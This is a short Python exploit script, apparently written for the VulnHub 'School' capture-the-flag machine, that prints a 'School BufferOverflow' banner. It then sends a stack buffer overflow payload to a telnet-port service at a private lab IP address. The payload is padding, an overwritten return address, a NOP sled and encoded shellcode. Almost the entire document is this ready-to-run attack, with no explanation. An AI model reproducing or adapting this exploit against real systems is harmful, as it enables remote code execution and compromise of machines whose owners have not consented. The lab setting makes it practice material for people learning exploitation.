#!/usr/bin/python

# Exploit for the VulnHub School machine.

import socket

print("""\
                    _____      _                 _                       
                   / ____|    | |               | |                      
                  | (___   ___| |__   ___   ___ | |                      
                   \___ \ / __| '_ \ / _ \ / _ \| |                      
                   ____) | (__| | | | (_) | (_) | |                      
  ____         __ |_____/ \___|_|_|_|\___/ \___/|_|   __ _               
 |  _ \       / _|/ _|         / __ \                / _| |              
 | |_) |_   _| |_| |_ ___ _ __| |  | |_   _____ _ __| |_| | _____      __
 |  _ <| | | |  _|  _/ _ \ '__| |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
 | |_) | |_| | | | ||  __/ |  | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
 |____/ \__,_|_| |_| \___|_|   \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
                                                                                                                                                  
                    """)
print("by: Xcatolin")

shellcode = ("\x33\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xfb\x03\x86\xbf\x83\xee\xfc\xe2\xf4\xca\xd8\x71\x5c\xa8\x40"
"\xd5\xd5\xf9\x8a\x67\x0f\x9d\xce\x06\x2c\xa2\xb3\xb9\x72\x7b"
"\x4a\xff\x46\x93\xc3\x2e\x87\x9d\x6b\x84\xbf\xff\xd1\x0f\x5e"
"\x4b\x65\xd6\xee\xa8\xb0\x85\x36\x1a\xce\x06\xed\x93\x6d\xa9"
"\xcc\x93\x6b\xa9\x90\x99\x6a\x0f\x5c\xa9\x50\x0f\x5e\x4b\x08"
"\x4b\x3f")

buffer = "A" * 1883 + "\xdd\x12\x50\x62" + "\x90" * 16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.110",23))
s.send('Verification Code: ' + buffer)
